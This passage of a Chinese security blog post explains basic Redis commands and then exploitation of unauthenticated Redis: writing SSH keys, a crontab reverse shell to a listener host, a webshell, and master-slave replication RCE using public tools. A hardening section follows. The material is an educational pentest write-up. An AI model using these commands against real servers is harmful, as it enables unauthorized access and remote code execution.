+<p>如果给定的字符串键里面， 有某个键不存在， 那么这个键的值将以特殊值 <code>nil</code> 表示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET redis redis.com</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SET mongodb mongodb.org</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb mysql     # 不存在的 mysql 返回 nil</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line">3) (nil)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>DEL key</strong></p>
+<p>删除key对应的键值数据。</p>
+<h3 id="2-3-4-hash类型命令"><a href="#2-3-4-hash类型命令" class="headerlink" title="2.3.4 hash类型命令"></a>2.3.4 hash类型命令</h3><p>类似一个对象或者结构体。</p>
+<p><strong>应用场景：</strong></p>
+<p>我们要存储一个用户信息对象数据，其中包括用户ID、用户姓名、年龄和生日，通过用户ID我们希望获取该用户的姓名或者年龄或者生日；</p>
+<p><strong>实现方式：</strong></p>
+<p>Redis的Hash实际是内部存储的Value为一个HashMap，并提供了直接存取这个Map成员的接口。如图所示，Key是用户ID, value是一个Map。这个Map的key是成员的属性名，value是属性值。这样对数据的修改和存取都可以直接通过其内部Map的Key(Redis里称内部Map的key为field), 也就是通过 key(用户ID) + field(属性标签) 就可以操作对应属性数据。</p>
+<p><strong>如图所示：</strong></p>
+<p><img src="http://image.v0w.top/Blog/2020-08-09-123507.jpg"></p>
+<p><strong>常用命令</strong></p>
+<ul>
+<li>hget hash field</li>
+<li>hset hash field value</li>
+<li>hgetall hash</li>
+<li>hmset key field value [f v…]</li>
+<li>HKEYS key</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; HSET 1 name &quot;V0WKeep3r&quot; brith 1998 age 22</span><br><span class="line">(integer) 3</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; Hget 1 name</span><br><span class="line">&quot;V0WKeep3r&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; hgetall 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;brith&quot;</span><br><span class="line">4) &quot;1998&quot;</span><br><span class="line">5) &quot;age&quot;</span><br><span class="line">6) &quot;22&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; hkeys 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;brith&quot;</span><br><span class="line">3) &quot;age&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-3-5-List类型命令"><a href="#2-3-5-List类型命令" class="headerlink" title="2.3.5 List类型命令"></a>2.3.5 List类型命令</h3><p><strong>LPUSH key value [value …] 插入元素创建列表</strong></p>
+<p>将一个或多个值 <code>value</code> 插入到列表 <code>key</code> 的表头</p>
+<p>如果有多个 <code>value</code> 值，那么各个 <code>value</code> 值按从左到右的顺序依次插入到表头： 比如说，对空列表 <code>mylist</code> 执行命令 <code>LPUSH mylist a b c</code> ，列表的值将是 <code>c b a</code> ，这等同于原子性地执行 <code>LPUSH mylist a</code> 、 <code>LPUSH mylist b</code> 和 <code>LPUSH mylist c</code> 三个命令。</p>
+<p>如果 <code>key</code> 不存在，一个空列表会被创建并执行 LPUSH 操作。</p>
+<p>当 <code>key</code> 存在但不是列表类型时，返回一个错误。</p>
+<p><strong>RPUSH key value [value …] 向表尾插入元素</strong></p>
+<p>不存在也会新建空列表。</p>
+<p><strong>LPOP key 移除并返回列表头元素</strong></p>
+<p><strong>RPOP key移除并返回列表尾元素</strong></p>
+<p><strong>LSET key index value 设置列表元素</strong></p>
+<p>将列表 <code>key</code> 下标为 <code>index</code> 的元素的值设置为 <code>value</code> 。当 <code>index</code> 参数超出范围，或对一个空列表( <code>key</code> 不存在)进行 LSET 时，返回一个错误。</p>
+<p><strong>LLEN key 获取列表长度</strong></p>
+<p><strong>LINDEX key index 通过索引获取列表元素</strong></p>
+<p><strong>LRANGE key start stop 返回区间中的元素</strong></p>
+<p>返回列表 <code>key</code> 中指定区间内的元素，区间以偏移量 <code>start</code> 和 <code>stop</code> 指定。</p>
+<p>下标(index)参数 <code>start</code> 和 <code>stop</code> 都以 <code>0</code> 为底，也就是说，以 <code>0</code> 表示列表的第一个元素，以 <code>1</code> 表示列表的第二个元素，以此类推。</p>
+<p>你也可以使用负数下标，以 <code>-1</code> 表示列表的最后一个元素， <code>-2</code> 表示列表的倒数第二个元素，以此类推。</p>
+<p><strong>LINSERT key BEFORE|AFTER pivot value 插入元素</strong></p>
+<p>将值 <code>value</code> 插入到列表 <code>key</code> 当中，位于值 <code>pivot</code> 之前或之后。</p>
+<p>当 <code>pivot</code> 不存在于列表 <code>key</code> 时，不执行任何操作。</p>
+<p>当 <code>key</code> 不存在时， <code>key</code> 被视为空列表，不执行任何操作。</p>
+<p>如果 <code>key</code> 不是列表类型，返回一个错误。</p>
+<p><strong>举例</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; llen list</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379[4]&gt; Lpush list <span class="string">&quot;V0W&quot;</span> <span class="string">&quot;V0WKeep3r&quot;</span> <span class="string">&quot;noob&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Rpush list <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;noob&quot;</span></span><br><span class="line">2) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">3) <span class="string">&quot;V0W&quot;</span></span><br><span class="line">4) <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; LPOP list</span><br><span class="line"><span class="string">&quot;noob&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; RPOP list</span><br><span class="line"><span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Lset list 1 Great</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[4]&gt; LLen list</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; Lindex list 0</span><br><span class="line"><span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Linsert list after <span class="string">&quot;Great&quot;</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">2) <span class="string">&quot;Great&quot;</span></span><br><span class="line">3) <span class="string">&quot;Hacker&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-3-6-Set类型命令"><a href="#2-3-6-Set类型命令" class="headerlink" title="2.3.6 Set类型命令"></a>2.3.6 Set类型命令</h3><p><strong>SADD key member [member …] 添加元素到集合</strong></p>
+<p>将一个或多个 <code>member</code> 元素加入到集合 <code>key</code> 当中，已经存在于集合的 <code>member</code> 元素将被忽略。</p>
+<p>假如 <code>key</code> 不存在，则创建一个只包含 <code>member</code> 元素作成员的集合。</p>
+<p>当 <code>key</code> 不是集合类型时，返回一个错误。</p>
+<p><strong>SPOP key 移除并返回集合中的一个随机元素</strong></p>
+<p>**SREM key member [member …] **</p>
+<p>移除集合 <code>key</code> 中的一个或多个 <code>member</code> 元素，不存在的 <code>member</code> 元素会被忽略。当 <code>key</code> 不是集合类型，返回一个错误。</p>
+<p><strong>SMEMBERS key 返回集合中的所有成员</strong></p>
+<p><strong>SINTER key [key …] 交集</strong></p>
+<p>返回一个集合的全部成员，该集合是所有给定集合的交集。不存在的 <code>key</code> 被视为空集。当给定集合当中有一个空集时，结果也为空集(根据集合运算定律)。</p>
+<p><strong>SUNION key [key …] 并集</strong></p>
+<p><strong>SDIFF key [key …] 差集</strong></p>
+<p><strong>举例</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; SADD students &quot;olivia&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;V0WKeep3r&quot; &quot;p0&quot; &quot;kingkk&quot; &quot;phithon&quot;</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Spop hackers 2</span><br><span class="line">1) &quot;kingkk&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SMembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; Srem hackers &quot;p0&quot;</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;p0&quot; &quot;kingkk&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Smembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;p0&quot;</span><br><span class="line">4) &quot;kingkk&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SUNION hackers students</span><br><span class="line">1) &quot;p0&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line">4) &quot;olivia&quot;</span><br><span class="line">5) &quot;phithon&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SINTER hackers students</span><br><span class="line">1) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SDIFF hackers students</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x03-Redis-在渗透测试中的利用"><a href="#0x03-Redis-在渗透测试中的利用" class="headerlink" title="0x03 Redis 在渗透测试中的利用"></a>0x03 Redis 在渗透测试中的利用</h1><h2 id="3-1-Redis未授权访问"><a href="#3-1-Redis未授权访问" class="headerlink" title="3.1 Redis未授权访问"></a>3.1 Redis未授权访问</h2><p><strong>redis-4.0.10 之前的版本</strong>   Redis服务默认时没有密码验证的，而且默认将redis绑定到0.0.0.0:6379，部分DBA在配置时不注意，同时也没有采用添加防火墙等安全策略，将会导致Redis服务直接暴露到公网。</p>
+<p>其他用户和攻击者可以在未授权的情况下，可以直接对redis进行访问，并进行操作。</p>
+<p><img src="http://image.v0w.top/Blog/2020-08-11-redis.png"></p>
+<p><strong>redis-4.0.10 之后的版本</strong> 默认开启了保护模式，仅允许本地无密码验证连接。如果再想利用，可能就要考虑弱口令和配置错误了。</p>
+<p><img src="http://image.v0w.top/Blog/2020-08-11-040217.png"></p>
+<p>Redis未授权漏洞常见的漏洞利用方式：</p>
+<ul>
+<li>Windows下，绝对路径写webshell 、写入启动项。</li>
+<li>Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。</li>
+</ul>
+<h2 id="3-2-信息泄漏"><a href="#3-2-信息泄漏" class="headerlink" title="3.2 信息泄漏"></a>3.2 信息泄漏</h2><p>通过上述Redis命令来获取信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO		# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *		# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall	# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb		# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-3-Redis-getshell"><a href="#3-3-Redis-getshell" class="headerlink" title="3.3 Redis getshell"></a>3.3 Redis getshell</h2><h3 id="3-3-1-利用Redis写公钥-进行ssh连接"><a href="#3-3-1-利用Redis写公钥-进行ssh连接" class="headerlink" title="3.3.1 利用Redis写公钥 进行ssh连接"></a>3.3.1 利用Redis写公钥 进行ssh连接</h3><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">#生成ssh公钥和私钥</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat redis_key.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"># 这里的换行符是防止密钥数据和其他的 redis 缓存数据混合</span><br><span class="line"></span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;key.txt | .&#x2F;redis-cli -h xxx.xxx.xxx.xxx -p 6379 -x set key </span><br><span class="line"># 将公钥写入redis，也可以通过连接redis再写，这里直接用管道写入了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"># 改变 redis 的 RDB 目录以及文件为 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"># 存盘，就会将ssh公钥保存到&#x2F;root&#x2F;.ssh&#x2F;auuthorized_keys</span><br></pre></td></tr></table></figure>
+
+
+
+<p> 将ssh公钥写入redis的键值</p>
+<p><img src="http://image.v0w.top/Blog/2020-08-13-043354.png"></p>
+<p>发现服务器已经被写入ssh公钥</p>
+<p><img src="http://image.v0w.top/Blog/2020-08-13-042409.png" alt="服务器被写入ssh公钥"></p>
+<p>通过ssh私钥连接到服务器，getshell。</p>
+<p><img src="http://image.v0w.top/Blog/2020-08-13-035016.png" alt="通过ssh私钥连接到服务器"></p>
+<h3 id="3-3-2-利用Redis-写-crontab任务反弹shell"><a href="#3-3-2-利用Redis-写-crontab任务反弹shell" class="headerlink" title="3.3.2 利用Redis 写 crontab任务反弹shell"></a>3.3.2 利用Redis 写 crontab任务反弹shell</h3><p>通过redis写键值，值由上一方法的ssh公钥变成crontable定时任务。定时任务的内容就是一个反弹shell的命令。然后保存到<code>/var/spool/cron/root</code></p>
+<blockquote>
+<p>/var/spool/cron/ 这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是/var/spool/cron/tom。一般一个用户最多只有一个crontab文件。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set poc2 &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;23333 0&gt;&amp;1\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+<p>理论上，我们的数据应该像写ssh时一样，较为完好的保存，并每过一分钟执行。</p>
+<p>事实上，我在测试此方法时，并没有成功，在任务写入/cron/root的过程中，似乎出现了错误，或者乱码。最终我的poc2，在/cron/root中的内容保存成这个样子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@centos-7 cron]# crontab -l</span><br><span class="line">REDIS0007�	redis-ver3.2.12�</span><br><span class="line">redis-bits�@�ctime�V�4_used-mem�f</span><br><span class="line">                                 ��poc2�8&#x3D;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 *�bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;182.9&#96;102&#x2F;23  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">���e;�8L</span><br></pre></td></tr></table></figure>
+
+<p>监听地址：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis服务：CentOS7 redis3.2.12  虚拟机</span><br><span class="line">攻击机： MACOS 10.15 </span><br><span class="line">VPS： 阿里云 ECS CentOS7</span><br></pre></td></tr></table></figure>
+
+<p>暂时不知道是什么原因导致的==、</p>
+<p>这一点很奇怪，困扰我很久==、</p>
+<p>于是尝试使用另一个地址，使用攻击机监听，结果成了==、</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc4&gt;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;10.211.55.2&#x2F;23333 0&gt;&amp;1 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="http://image.v0w.top/Blog/2020-08-13-070355.png"></p>
+<h3 id="3-3-3-利用Redis-写webshell"><a href="#3-3-3-利用Redis-写webshell" class="headerlink" title="3.3.3 利用Redis 写webshell"></a>3.3.3 利用Redis 写webshell</h3><p>和前两个思路一样。</p>
+<p>通过redis写键值，值变成一句话木马等。然后保存到<code>/var/www/html</code>或是其他web目录。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename redis_shell.php</span><br><span class="line">OK</span><br><span class="line">&gt; keys *</span><br><span class="line">1) &quot;hacker&quot;</span><br><span class="line">&gt; del hacker</span><br><span class="line">(integer) 1</span><br><span class="line">&gt; set shell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure>
+
+<p>之后webshell文件就写入了web目录，就可以getshell了。</p>
+<p><img src="http://image.v0w.top/Blog/2020-08-13-073527.png"></p>
+<h3 id="3-3-4-利用Redis主从复制getshell"><a href="#3-3-4-利用Redis主从复制getshell" class="headerlink" title="3.3.4 利用Redis主从复制getshell"></a>3.3.4 利用Redis主从复制getshell</h3><p>基于Redis主从复制的机制，可以通过FULLRESYNC将任意文件同步到从节点（slave），这就使得它可以轻易实现以上任何一种漏洞利用方式，而且存在着更多的可能性，等待被探索。</p>
+<p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用条件: Redis 4.x/5.x</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line"><span class="built_in">cd</span> RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/redis-rce.git</span><br><span class="line"><span class="built_in">cd</span> redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://image.v0w.top/Blog/2020-08-19-085343.png"></p>
+<p><strong>Bypass师傅0rz 分析过该漏洞的原理：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13089906.html">Redis主从复制getshell技巧</a></strong></p>
+<h1 id="0x04-Redis安全防御"><a href="#0x04-Redis安全防御" class="headerlink" title="0x04 Redis安全防御"></a>0x04 Redis安全防御</h1><ol>
+<li><p><strong>禁用高危命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 redis.conf 文件中直接将危险命令置空，或者改变其名字</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>以低权限运行 Redis 服务</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis默认使用用户权限启动的，降权可以避免getshell后直接root</span><br><span class="line">groupadd -r redis   </span><br><span class="line">useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>为 Redis 添加密码验证</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件，添加</span><br><span class="line"></span><br><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>做好访问控制，在不需要接外网时，就bind本地。</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件：</span><br><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>修改默认端口</strong></p>
+</li>
+<li><p><strong>设置隐藏文件属性，不允许修改authorized_keys</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 400 ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>设置防火墙策略，只允许特定IP连接</strong></p>
+</li>
+</ol>
+<h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/powertoolsteam/p/redis.html">Redis是什么？看这一篇就够了</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://redisdoc.com/">http://redisdoc.com/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://redisguide.com/">http://redisguide.com/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/08/Redis%20%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8">k0rz3n-Redis 基础梳理以及其在渗透测试中的利用</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://p0sec.net/index.php/archives/69/">p0-redis未授权访问漏洞利用总结</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13089906.html">Bypass-Redis主从复制getshell技巧</a></p>
+</li>
+</ul>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="/v0w.top/2020/08/05/Redis-getshell/">v0w.top/2020/08/05/Redis-getshell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/webshell/">webshell</a><a class="post-meta__tags" href="/tags/mysql/">mysql</a><a class="post-meta__tags" href="/tags/Redis/">Redis</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044057.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044040.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/26/CodeAudit-php/"><i class="fa fa-chevron-left">  </i><span>代码审计常见的三种方法（PHP篇）</span></a></div><div class="next-post pull-right"><a href="/2020/07/19/vulnstack1/"><span>红日安全vulnstack-ATT&amp;CK实战系列 红队实战（一）</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'xuqLRcah5FaInOgKRdj9JB3V-gzGzoHsz',
+  appKey:'8vMPXnFoh7Fih1g29jw4JNxl',
+  placeholder:'师傅可以留下你的评论和邮箱，V0W能够通过邮件get并回复哦～',
+  avatar:'retro',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer class="footer-bg" style="background-image: url(/img/index.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By V0WKeep3r</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
